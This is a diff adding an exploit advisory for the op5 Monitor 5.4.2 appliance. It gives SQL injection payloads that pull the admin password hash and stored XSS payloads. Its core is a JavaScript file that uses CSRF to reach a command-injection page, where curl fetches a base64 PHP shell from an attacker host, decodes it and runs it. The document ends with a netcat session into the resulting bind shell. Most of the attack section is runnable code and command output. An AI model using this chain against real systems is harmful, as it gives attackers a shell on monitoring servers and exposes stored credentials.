@@ -1,0 +1,213 @@
+# Author: loneferret of Offensive Security
+# Product: op5 Monitoring (VM appliance)
+# Version: 5.4.2
+# Vendor Site: http://www.op5.com/
+# Software Download: http://www.op5.com/get-op5-monitor/get-started/
+
+# Software Description:
+# op5 is a market leading developer of Open Source Management solutions. 
+# op5 develops and delivers enterprise-class software for monitoring and administration 
+# of the whole IT, from hardware and software all the way to virtual or cloud based services. 
+# The solutions comes in a fully supported package called op5 Monitor. The architecture 
+# supports scalability from the small and business critical IT to the very large IT with 
+# tens of thousands of actively controlled services.
+
+# Vulnerabilities:
+# SQL Injection
+# Cross Site Request Forgery
+# Stored XSS
+
+
+# Description path to Shell:
+# Several vulnerabilities are present in this software. All of which need different 
+# levels of authentication. SQLi, CSRF and Stored XSS are present and can be 
+# triggered giving variant degrees of results. From interesting to just plain annoying.
+#
+# But most interesting is the admin's (or the default monitor user) ability to run
+# shell commands from the web-interface. Although these commands are limited, it is
+# still possible to get a shell providing some conditions are met.
+#
+# As all of the vulnerabilities are post-authentication, it assumes the attacker is
+# a user with access to the web application. In this case, a low-privilege user is enough to 
+# get the ball rolling in getting a shell. With enough access our "disgruntled employee"
+# can leverage the XSS & CSRF vulnerabilities and trick the higher privileged users to 
+# setup a Bind-Shell.
+
+# SQLi PoC 1:
+# Minimum Access Rights needed: authorized_for_all_hosts
+# Page: /index.php/status/hostgroup_grid?items_per_page=
+# Original SQL statement called: select * from hostgroup limit 0 union 10 offset 0
+# Injection point: select * from hostgroup limit 0 union <HERE> offset 0
+# Payload: 0' union select 1,2,3,4,5,6,7--
+# Get password hash for user with '1' (usually monitor)
+# hostgroup_grid?items_per_page=0 union select 1,2,(select password from users where id=1),4,5,6,7--
+
+
+# mysql> describe users;
+# +---------------+------------------+------+-----+----------+----------------+
+# | Field         | Type             | Null | Key | Default  | Extra          |
+# +---------------+------------------+------+-----+----------+----------------+
+# | id            | int(11) unsigned | NO   | PRI | NULL     | auto_increment | 
+# | realname      | varchar(100)     | NO   |     | NULL     |                | 
+# | email         | varchar(127)     | NO   |     | NULL     |                | 
+# | username      | varchar(100)     | NO   | UNI |          |                | 
+# | password_algo | varchar(20)      | NO   |     | b64_sha1 |                | 
+# | password      | varchar(50)      | NO   |     | NULL     |                | 
+# | logins        | int(10) unsigned | NO   |     | 0        |                | 
+# | last_login    | int(10) unsigned | YES  |     | NULL     |                | 
+# +---------------+------------------+------+-----+----------+----------------+
+
+# SQLi PoC 2:
+# Page: all?items_per_page=
+# https://victim/monitor/index.php/status/service/all?items_per_page=25,0--
+
+# Stored XSS PoC:
+# Minimum Access Rights needed:	authorized_for_all_hosts
+#								authorized_for_all_host_commands
+# Page: /index.php/command/submit?host=[SYSTEM-NAME]&service=&cmd_typ=ADD_HOST_COMMENT
+# In the Comment input field
+# Payload: 	<script>alert(document.cookie);</script>
+#			<iframe src="http://something.html></iframe>
+#			<script src="http://attacker/xss.js></script>
+
+
+#
+# Setup for shell
+# With some explanations...
+
+# Step 1: XSS
+# Payload in Host Comment: <script src="http://attacker/op5-shell.js"></script>	
+
+# Step 2: Create JavaScript file to download shell file.
+# op5-shell.js File
+#
+
+function triggerShell(){
+		var url = "https://victim/monitor/op5/nacoma/command_test.php?cmd_str=ifconfig;";
+		url += "curl http://attcker/b64shell.txt > /tmp/b64Bind.txt;"
+		url += "base64 -d /tmp/b64Bind.txt > /tmp/hell.txt;php /tmp/hell.txt";
+        var request = new XMLHttpRequest();
+        request.open('GET', url, false);
+        request.send(null);
+}
+
+function setupConf(){
+		// The admin needs to visit this page at least once, in order to get the CSRF to work and 
+		// call the 'command_test.php?cmd_str' and issue commands. Once the page has been
+		// successfully called, we request our malicious link.
+		
+        var request = new XMLHttpRequest();
+        request.open('GET', 'https://victim/monitor/index.php/configuration/configure', false);
+        request.send(null);
+        if (request.status === 200) {
+                triggerShell();
+        }
+}
+
+setupConf();
+
+#
+# End of file
+
+# Step 3:
+# netcat into victim on port 4444
+
+# Well that's pretty much it. Once the administrator looks at the comment page associated with
+# the machine the XSS is triggered and things happen. The fun part is, even if the comment
+# is deleted, it's saved in the logs. So when that is visited the the Bind-Shell is
+# triggered once again. It's actually a pain to get rid of once it's there.
+#
+# Shell commands from the Web-Interface:
+# These are very limited in regards of rights and privileges. The commands aren't run
+# directly from  a command shell but rather using a small complied script call "asmonitor".
+# All the commands, from a shell's standpoint, are run with the "monitor" user.
+
+# bash-3.2$ /usr/bin/asmonitor 
+# usage: asmonitor arg1 arg2 arg3 argn...
+
+# Chaining multiple commands is not permitted and only the first command will succeed 
+# with the second one failing. Also commands requiring multiple parameters, such
+# as 'wget' will also fail. As "asmonitor" mistakes options as commands due to the spaces
+# between them.
+# One way to circumvent this limitation of multiple commands is with the " ; " character.
+# Example, "ifconfig ifconfig" will not work, with only the first "ifconfig" to successfully
+# execute. Placing "ifconfig;ifconfig" in the web-interfaces's input box will result in
+# both commands executing. This leads us to deduce the second 'ifconfig' is not running
+# in a jailed environment. Providing us with a greater arsenal of commands available to us.
+#
+# Unfortunately due to rights restriction, we can't just download a file directly to our webroot.
+# We do have a few rights in the /tmp folder. Unfortunately we can't just download a file
+# file there either. This is what "wget" with the "-o" options gives:
+
+# Command:
+#	ifconfig;wget http://attacker/xss.js -o /tmp/test.txt
+# --2012-08-22 04:03:46--  http://172.16.194.188/xss.js
+# Connecting to 172.16.194.188:80... connected.
+# HTTP request sent, awaiting response... 200 OK
+# Length: 14 [application/javascript]
+# xss.js: Permission denied
+#
+# Cannot write to `xss.js' (Permission denied).
+
+
+
+# We can however save the output of a file called remotely using 'curl'.
+# Command:
+#	curl http://attacker/remote.txt > /tmp/test.txt
+|
+# bash-3.2$ cat test.txt 
+#  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+#                                 Dload  Upload   Total   Spent    Left  Speed
+#  0    23    0    23    0     0  18668      0 --:--:-- --:--:-- --:--:--     0
+# Content of Remote file
+
+# Well it's not perfect, and we still can't download a shell since the all that 
+# transfer information gets in the way of any PHP tags. We can however output text, 
+# which would be our shell code base64 encoded. This way curl will just display content
+# of the file.
+# Command:
+# 	curl http://attcker/b64shell.txt > /tmp/b64Bind.txt;base64 -d /tmp/b64Bind.txt > /tmp/hell.txt
+|
+# bash-3.2$ cat b64Bind.txt 
+# PD9waHAJCQoJCQlAc2V0X3RpbWVfbGltaXQoMCk7IEB.... and so on.
+
+# From here, using our jailbroken "shell" from the web interface, it's a simple
+# matter of decoding it [base64 -d /tmp/b64Bind.txt > /tmp/hell.txt]. 
+# Command:
+|
+# bash-3.2$ cat hell.txt 
+# < ?php		
+#			@set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
+#			.
+#			.
+#			.
+# ? >
+			
+# Luckily for us we can execute some stuff as well from our web interface.
+# From here we simply call our PHP shell using the "php" command, this should open
+# us port 4444 give provide us with a shell on the system.
+|
+# Victim Machine:
+# bash-3.2$ netstat -antp | grep 4444
+# (Not all processes could be identified, non-owned process info
+# will not be shown, you would have to be root to see it all.)
+# tcp        0      0 0.0.0.0:4444                0.0.0.0:*                   LISTEN      9432/php            
+
+# Attacking Machine:
+# root@harvey:~# ifconfig eth2
+# eth2     Link encap:Ethernet  HWaddr 00:50:56:3b:4b:ad  
+#          inet addr:172.16.194.188  Bcast:172.16.194.255  Mask:255.255.255.0
+#          inet6 addr: fe80::250:56ff:fe3b:4bad/64 Scope:Link
+#          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+#          RX packets:160217 errors:0 dropped:0 overruns:0 frame:0
+#          TX packets:205140 errors:0 dropped:0 overruns:0 carrier:0
+#          collisions:0 txqueuelen:1000 
+#          RX bytes:32606164 (32.6 MB)  TX bytes:140956811 (140.9 MB)
+#          Interrupt:19 Base address:0x2080 
+|
+# root@harvey:~# nc -vn 172.16.194.198 4444
+# (UNKNOWN) [172.16.194.198] 4444 (?) open
+# whoami
+# apache
+# uname -a
+# Linux op5-system 2.6.18-164.11.1.el5 #1 SMP Wed Jan 20 07:32:21 EST 2010 x86_64 x86_64 x86_64 GNU/Linux
